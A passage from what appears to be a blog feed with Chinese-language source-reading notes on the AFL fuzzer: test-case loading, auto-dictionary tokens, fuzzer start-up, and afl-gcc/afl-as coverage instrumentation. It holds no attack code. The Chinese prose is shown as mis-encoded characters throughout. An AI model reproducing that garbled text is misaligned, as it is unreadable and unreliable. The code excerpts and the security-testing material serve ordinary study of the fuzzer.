directory.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;No usable test cases in &#x27;%s&#x27;&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  last_path_time = <span class="number">0</span>;</span><br><span class="line">  queued_at_start = queued_paths;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯»å–è¾“å…¥ç›®å½•ä¸­çš„æ‰€æœ‰æµ‹è¯•ç”¨ä¾‹å¹¶å°†å…¶æ’é˜Ÿç­‰å¾…æµ‹è¯•ï¼Œæ­¤å‡½æ•°åœ¨å¯åŠ¨æ—¶è°ƒç”¨ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Auto-detect non-in-place resumption attempts. */</span></span><br><span class="line"></span><br><span class="line">fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/queue&quot;</span>, in_dir);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">access</span>(fn, F_OK)) in_dir = fn; <span class="keyword">else</span> <span class="built_in">ck_free</span>(fn);</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥æ˜¯å¦å­˜åœ¨<code>&lt;in-dir&gt;/queue</code>ç›®å½•ï¼Œå­˜åœ¨çš„è¯è®¾ç½®ä¸ºæ–°çš„<code>in_dir</code>ï¼Œä¸ºäº†æ”¯æŒæ¢å¤ä¹‹å‰çš„æ¨¡ç³Šæµ‹è¯•ä¼šè¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We use scandir() + alphasort() rather than readdir() because otherwise,</span></span><br><span class="line"><span class="comment"> the ordering  of test cases would vary somewhat randomly and would be</span></span><br><span class="line"><span class="comment"> difficult to control. */</span></span><br><span class="line"></span><br><span class="line">nl_cnt = <span class="built_in">scandir</span>(in_dir, &amp;nl, <span class="literal">NULL</span>, alphasort);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nl_cnt &lt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (errno == ENOENT || errno == ENOTDIR)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">       <span class="string">&quot;The input directory does not seem to be valid - try again. The fuzzer needs\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    one or more test case to start with - ideally, a small file under 1 kB\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    or so. The cases must be stored as regular files directly in the input\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    directory.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>scandir()</code>å‡½æ•°éå†<code>in_dir</code>ï¼Œé€šè¿‡<code>alphasort()</code>ç¡®ä¿æµ‹è¯•ç”¨ä¾‹æŒ‰å­—æ¯é¡ºåºæ’åº</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (shuffle_queue &amp;&amp; nl_cnt &gt; <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">ACTF</span>(<span class="string">&quot;Shuffling queue...&quot;</span>);</span><br><span class="line"><span class="built_in">shuffle_ptrs</span>((<span class="type">void</span>**)nl, nl_cnt);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœå¯ç”¨äº†<code>shuffle_queue</code>ä¸”åŒæ—¶å­˜åœ¨å¤šä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œä½¿ç”¨<code>shuffle_ptrs</code>å‡½æ•°éšæœºæ’åˆ—æµ‹è¯•ç”¨ä¾‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nl_cnt; i++) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">stat</span> st;</span><br><span class="line"></span><br><span class="line">u8* fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line">u8* dfn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.state/deterministic_done/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line"></span><br><span class="line">u8  passed_det = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(nl[i]); <span class="comment">/* not tracked */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">lstat</span>(fn, &amp;st) || <span class="built_in">access</span>(fn, R_OK))</span><br><span class="line">  <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to access &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This also takes care of . and .. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">S_ISREG</span>(st.st_mode) || !st.st_size || <span class="built_in">strstr</span>(fn, <span class="string">&quot;/README.testcases&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ck_free</span>(fn);</span><br><span class="line">  <span class="built_in">ck_free</span>(dfn);</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (st.st_size &gt; MAX_FILE) </span><br><span class="line">  <span class="built_in">FATAL</span>(<span class="string">&quot;Test case &#x27;%s&#x27; is too big (%s, limit is %s)&quot;</span>, fn,</span><br><span class="line">        <span class="built_in">DMS</span>(st.st_size), <span class="built_in">DMS</span>(MAX_FILE));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for metadata that indicates that deterministic fuzzing</span></span><br><span class="line"><span class="comment">   is complete for this entry. We don&#x27;t want to repeat deterministic</span></span><br><span class="line"><span class="comment">   fuzzing when resuming aborted scans, because it would be pointless</span></span><br><span class="line"><span class="comment">   and probably very time-consuming. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">access</span>(dfn, F_OK)) passed_det = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">ck_free</span>(dfn);</span><br><span class="line"></span><br><span class="line"><span class="built_in">add_to_queue</span>(fn, st.st_size, passed_det);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤éå¸¸è§„æ–‡ä»¶ã€ç©ºæ–‡ä»¶å’ŒREADMEæ–‡ä»¶ï¼›å°†æœ‰æ•ˆçš„æµ‹è¯•ç”¨ä¾‹æ·»åŠ åˆ°é˜Ÿåˆ—</p><h4 id="load-auto"><a href="#load-auto" class="headerlink" title="load_auto"></a>load_auto</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">load_auto</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; USE_AUTO_EXTRAS; i++) &#123;</span><br><span class="line"></span><br><span class="line">    u8  tmp[MAX_AUTO_EXTRA + <span class="number">1</span>];</span><br><span class="line">    u8* fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.state/auto_extras/auto_%06u&quot;</span>, in_dir, i);</span><br><span class="line">    s32 fd, len;</span><br><span class="line"></span><br><span class="line">    fd = <span class="built_in">open</span>(fn, O_RDONLY, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (errno != ENOENT) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line">      <span class="built_in">ck_free</span>(fn);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We read one byte more to cheaply detect tokens that are too</span></span><br><span class="line"><span class="comment">       long (and skip them). */</span></span><br><span class="line"></span><br><span class="line">    len = <span class="built_in">read</span>(fd, tmp, MAX_AUTO_EXTRA + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to read from &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &gt;= MIN_AUTO_EXTRA &amp;&amp; len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">      <span class="built_in">maybe_add_auto</span>(tmp, len);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="built_in">ck_free</span>(fn);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (i) <span class="built_in">OKF</span>(<span class="string">&quot;Loaded %u auto-discovered dictionary tokens.&quot;</span>, i);</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">OKF</span>(<span class="string">&quot;No auto-generated dictionary tokens to reuse.&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†ä¹‹å‰æ¨¡ç³Šæµ‹è¯•ä¼šè¯ä¸­å‘ç°çš„æœ‰ä»·å€¼çš„å­—èŠ‚åºåˆ—(token)åŠ å…¥å­—å…¸ä¸­ï¼Œç”¨äºæ–°çš„æ¨¡ç³Šæµ‹è¯•ä¼šè¯</p><blockquote><p>ä¼šå‘ç°ä¸Šè¿°æ¶‰åŠä¸¤ä¸ªæ¦‚å¿µï¼štoken å’Œ å­—å…¸</p><p>å­—å…¸é‡Œå­˜å‚¨ç€afl-fuzzè®¤å®šçš„æœ‰æ•ˆtokenï¼Œå­˜åœ¨å¿…è¦æ€§</p><p>ä¾‹å¦‚ï¼špngæ–‡ä»¶çš„æ–‡ä»¶å¤´æ˜¯<code>IHDR</code>ï¼Œå½“afl-fuzzå˜å¼‚åˆ°<code>I</code>å­—èŠ‚åï¼Œå› ä¸ºå‘ç”Ÿäº†é”™è¯¯ï¼Œæ‰€ä»¥èµ°åˆ°äº†ä¸€ä¸ªä¸åŒçš„æ‰§è¡Œè·¯å¾„ï¼Œç„¶åç»§ç»­<code>H</code> <code>D</code> <code>R</code>çš„å˜å¼‚ï¼Œä¼šå‘ç°ä¸å­—èŠ‚<code>I</code>å˜å¼‚èµ°åˆ°äº†åŒä¸€ä¸ªæ‰§è¡Œè·¯å¾„ï¼Œéƒ½å‘ç”Ÿäº†åŒä¸€ä¸ªé”™è¯¯ï¼Œé‚£ä¹ˆafl-fuzzä¼šè®¤å®š<code>IHDR</code>æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ã€ä¸å¯åˆ†å‰²çš„å­—èŠ‚å•å…ƒï¼Œå°†å…¶åŠ å…¥å­—å…¸åï¼Œå†æ¬¡ç”¨fuzzé‡åˆ°å®ƒå°±ä¸ä¼šå†è¿›è¡Œé€å­—èŠ‚çš„å˜å¼‚äº†</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pivot_inputs</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (extras_dir) <span class="built_in">load_extras</span>(extras_dir);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!timeout_given) <span class="built_in">find_timeout</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">detect_file_args</span>(argv + optind + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!out_file) <span class="built_in">setup_stdio_file</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">check_binary</span>(argv[optind]);</span><br><span class="line"></span><br><span class="line">start_time = <span class="built_in">get_cur_time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (qemu_mode)</span><br><span class="line">use_argv = <span class="built_in">get_qemu_argv</span>(argv[<span class="number">0</span>], argv + optind, argc - optind);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">use_argv = argv + optind;</span><br><span class="line"></span><br><span class="line"><span class="built_in">perform_dry_run</span>(use_argv);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cull_queue</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">show_init_stats</span>();</span><br><span class="line"></span><br><span class="line">seek_to = <span class="built_in">find_start_position</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">write_stats_file</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">save_auto</span>();</span><br></pre></td></tr></table></figure><p><code>pivot_inputs</code>ï¼šè§„èŒƒå‘½åï¼Œä¼˜å…ˆä½¿ç”¨ç¡¬é“¾æ¥è€Œéå¤åˆ¶ï¼Œè®°å½•æµ‹è¯•ç”¨ä¾‹ä¹‹é—´çš„æ´¾ç”Ÿå…³ç³»</p><p><code>load_extras</code>ï¼šå¯ä»¥é€šè¿‡è®¾ç½®<code>-x</code>é€‰é¡¹åŠ è½½ä»»æ„ä¸€ä¸ªdictæ–‡ä»¶ï¼ˆå­—å…¸ï¼‰æˆ–è€…ç›®å½•</p><p><code>find_timeout</code>ï¼šè®¾ç½®è¶…æ—¶æ—¶é—´</p><p><code>detect_file_args&amp;&amp;setup_stdio_file</code>ï¼šæ£€æµ‹æœ«å°¾æ˜¯å¦æœ‰<code>@@</code></p><ul><li>å¦‚æœæœ‰<code>@@</code>ï¼Œåˆ™afl-fuzzä¼šä»æ–‡ä»¶è¯»å–ï¼Œæ— è®ºæ˜¯é»˜è®¤çš„<code>&lt;out_dir&gt;/.cur_input</code>è¿˜æ˜¯ç”¨æˆ·æŒ‡å®šçš„ï¼ˆ-fï¼‰ã€‚</li><li>å¦‚æœæ²¡æœ‰<code>@@</code>ä½†æœ‰-fï¼Œåˆ™è¡¨æ˜aflä¼šä»ç”¨æˆ·æŒ‡å®šçš„æ–‡ä»¶è¯»å–</li><li>å¦‚æœæ²¡æœ‰<code>@@</code>ä¸”æ²¡æœ‰-fï¼Œåˆ™è¡¨æ˜ä»æ ‡å‡†è¾“å…¥è¯»å–ã€‚</li></ul><p><code>check_binary</code>ï¼šæ£€æŸ¥äºŒè¿›åˆ¶æ–‡ä»¶çš„åˆæ³•æ€§</p><p><code>get_cur_time</code>ï¼šè·å–å½“å‰çš„å‡†ç¡®æ—¶é—´</p><p><code>get_qemu_argv</code>ï¼šè§£æqemuçš„å‚æ•°</p><p>ä¾‹å¦‚ï¼š<code>./afl-fuzz -Q -i testcases/input -o findings -- ./target_binary @@</code>è¿è¡Œè¿™ä¸ªå‘½ä»¤</p><p>é‚£ä¹ˆåœ¨è¯¥å‡½æ•°ä¸­å°±ä¼šå°†å…¶è§£ææˆï¼š<code>./afl-qemu-trace -- ./target_binary @@</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;afl-fuzzæºç é˜…è¯»&quot;&gt;&lt;a href=&quot;#afl-fuzzæºç é˜…è¯»&quot; class=&quot;headerlink&quot; title=&quot;afl-fuzzæºç é˜…è¯»&quot;&gt;&lt;/a&gt;afl-fuzzæºç é˜…è¯»&lt;/h2&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;ta</summary>
      
    
    
    
    
    <category term="Fuzz" scheme="http://s1nec-1o.github.io/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>AFLæºç é˜…è¯»ä¹‹afl-gcc&amp;afl-as</title>
    <link href="http://s1nec-1o.github.io/2025/07/28/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E4%B9%8Bafl-gcc&amp;afl-as/"/>
    <id>http://s1nec-1o.github.io/2025/07/28/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E4%B9%8Bafl-gcc&amp;afl-as/</id>
    <published>2025-07-28T12:56:29.000Z</published>
    <updated>2025-07-28T13:17:47.123Z</updated>
    
    <content type="html"><![CDATA[<h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p><strong>basic block(åŸºæœ¬å—)ã€edge(è¾¹)ã€ä»£ç è¦†ç›–ç‡</strong></p><p>edgeå°±è¢«ç”¨æ¥è¡¨ç¤ºåœ¨åŸºæœ¬å—ä¹‹é—´çš„è·³è½¬ï¼ŒçŸ¥é“äº†æ¯ä¸ªåŸºæœ¬å—å’Œè·³è½¬çš„æ‰§è¡Œæ¬¡æ•°ï¼Œå°±å¯ä»¥çŸ¥é“ç¨‹åºä¸­çš„æ¯ä¸ªè¯­å¥å’Œåˆ†æ”¯çš„æ‰§è¡Œæ¬¡æ•°ï¼Œä»è€Œè·å¾—æ¯”è®°å½•BBæ›´ç»†ç²’åº¦çš„è¦†ç›–ç‡ä¿¡æ¯</p><p>ä»£ç è¦†ç›–ç‡æ˜¯ä¸€ç§åº¦é‡ä»£ç çš„è¦†ç›–ç¨‹åº¦çš„æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯æŒ‡æºä»£ç ä¸­çš„æŸè¡Œä»£ç æ˜¯å¦å·²æ‰§è¡Œï¼›å¯¹äºŒè¿›åˆ¶ç¨‹åºï¼Œè¿˜å¯å°†æ­¤æ¦‚å¿µç†è§£ä¸ºæ±‡ç¼–ä»£ç ä¸­çš„æŸæ¡æŒ‡ä»¤æ˜¯å¦å·²æ‰§è¡Œã€‚</p><p><strong>è¦†ç›–ç‡åŠ«æŒï¼š</strong></p><ol><li><p>åŠ«æŒæ±‡ç¼–å™¨ï¼ˆafl-gccã€afl-clangã€afl-g++ï¼‰ï¼Œé€šè¿‡è¯†åˆ«è·³è½¬æŒ‡ä»¤ï¼Œç„¶ååœ¨å…¶ä¸­æ’å…¥ä¸€æ®µæ±‡ç¼–ç”¨äºä¸AFLä¹‹é—´çš„é€šä¿¡(<code>__afl_maybe_log</code>)</p></li><li><p>clangå†…ç½®ï¼ŒLLVM å†…ç½®äº†ä¸€ä¸ªç®€å•çš„ä»£ç è¦†ç›–ç‡æ£€æµ‹ ï¼ˆSanitizerCoverageï¼‰ï¼Œå®ƒåœ¨å‡½æ•°ã€åŸºæœ¬å—å’Œè¾¹ç¼˜çº§åˆ«æ’å…¥å¯¹ç”¨æˆ·å®šä¹‰å‡½æ•°çš„è°ƒç”¨ã€‚æä¾›äº†è¿™äº›å›è°ƒçš„é»˜è®¤å®ç°ï¼Œå¹¶å®ç°äº†ç®€å•çš„è¦†ç›–ç‡æŠ¥å‘Šå’Œå¯è§†åŒ–</p><p>ç¼–è¯‘å™¨å°†åœ¨ <code>-fsanitize-coverage=trace-pc-guard</code> æ¯ä¸ªè¾¹ç¼˜æ’å…¥ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__sanitizer_cov_trace_pc_guard(<span class="type">uint32_t</span>* guard_variable)</span><br></pre></td></tr></table></figure><p>æ¯æ¡è¾¹éƒ½æœ‰è‡ªå·±çš„ guard_variableï¼Œæ¯å½“å¯¹åº”çš„edgeè¢«æ‰§è¡Œåˆ°æ—¶ï¼Œéƒ½ä¼šå‘å…±äº«å†…å­˜ä¸­å¯¹list[*guard_variable]è¿›è¡Œ++æ“ä½œ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è¯¥å‡½æ•°å¤„äºAFL/llvm_mode/afl-llvm-rt.o.c</span></span><br><span class="line"><span class="comment">/* The following stuff deals with supporting -fsanitize-coverage=trace-pc-guard.</span></span><br><span class="line"><span class="comment">   It remains non-operational in the traditional, plugin-backed LLVM mode.</span></span><br><span class="line"><span class="comment">   For more info about &#x27;trace-pc-guard&#x27;, see README.llvm.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The first function (__sanitizer_cov_trace_pc_guard) is called back on every</span></span><br><span class="line"><span class="comment">   edge (as opposed to every basic block). */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __sanitizer_cov_trace_pc_guard(<span class="type">uint32_t</span>* guard) &#123;</span><br><span class="line">  __afl_area_ptr[*guard]++;<span class="comment">//__afl_area_ptræ˜¯å…±äº«å†…å­˜çš„æŒ‡é’ˆ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__sanitizer_cov_trace_pc_guard_init(<span class="type">uint32_t</span> *start, <span class="type">uint32_t</span> *stop);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä¼šåœ¨å¯æ‰§è¡Œæ–‡ä»¶å¼€å§‹æ‰§è¡Œæ—¶ä¼šè°ƒç”¨ä¸€æ¬¡ï¼Œæ¯ä¸€ä¸ªæœ‰å‘è¾¹å¯¹åº”ä¸€ä¸ª<code>*guard</code>å€¼ï¼Œå‚æ•°startæ˜¯ç¬¬ä¸€ä¸ªguardæŒ‡é’ˆï¼Œä»£è¡¨ç¬¬ä¸€æ¡è¾¹ï¼›stopæ˜¯æœ€åä¸€ä¸ªguardæŒ‡é’ˆï¼Œä»£è¡¨æœ€åä¸€æ¡è¾¹ï¼Œéå†startåˆ°stopå°±å¯ä»¥ç»™æ¯ä¸ªguardæŒ‡é’ˆæŒ‡å‘çš„å€¼åˆå§‹åŒ–ä¸€ä¸ªéšæœºæ•°ï¼ˆä½†æ˜¯å®é™…ä¸Šè¿™ä¸ªå€¼å¯ä»¥ç”±ç”¨æˆ·æ¥å†³å®šï¼‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//AFL/llvm_mode/afl-llvm-rt.o.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __sanitizer_cov_trace_pc_guard(<span class="type">uint32_t</span>* guard) &#123;</span><br><span class="line">  __afl_area_ptr[*guard]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Init callback. Populates instrumentation IDs. Note that we&#x27;re using</span></span><br><span class="line"><span class="comment">   ID of 0 as a special value to indicate non-instrumented bits. That may</span></span><br><span class="line"><span class="comment">   still touch the bitmap, but in a fairly harmless way. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __sanitizer_cov_trace_pc_guard_init(<span class="type">uint32_t</span>* start, <span class="type">uint32_t</span>* stop) &#123;</span><br><span class="line"></span><br><span class="line">  u32 inst_ratio = <span class="number">100</span>;</span><br><span class="line">  u8* x;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (start == stop || *start) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  x = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_INST_RATIO&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (x) inst_ratio = <span class="built_in">atoi</span>(x);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!inst_ratio || inst_ratio &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;[-] ERROR: Invalid AFL_INST_RATIO (must be 1-100).\n&quot;</span>);</span><br><span class="line">    <span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure that the first element in the range is always set - we use that</span></span><br><span class="line"><span class="comment">     to avoid duplicate calls (which can happen as an artifact of the underlying</span></span><br><span class="line"><span class="comment">     implementation in LLVM). */</span></span><br><span class="line"></span><br><span class="line">  *(start++) = <span class="built_in">R</span>(MAP_SIZE - <span class="number">1</span>) + <span class="number">1</span>;<span class="comment">//åˆå§‹åŒ–åˆå§‹å€¼</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (start &lt; stop) &#123;<span class="comment">//ä¸ºæ¯ä¸€ä¸ª*guardèµ‹åˆå§‹å€¼*start = R(MAP_SIZE - 1) + 1;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">R</span>(<span class="number">100</span>) &lt; inst_ratio) *start = <span class="built_in">R</span>(MAP_SIZE - <span class="number">1</span>) + <span class="number">1</span>;<span class="comment">//#  define R(x) (random() % (x))ã€randoméšæœºæ•°ã€‘</span></span><br><span class="line">    <span class="keyword">else</span> *start = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    start++;<span class="comment">//æŒ‡é’ˆéå†ï¼ˆuint32_tï¼‰</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ä½†æ˜¯ä¸å¯é¿å…çš„ï¼Œä¼šæœ‰æ¦‚ç‡å‡ºç°å†²çªçš„æƒ…å†µï¼Œå› 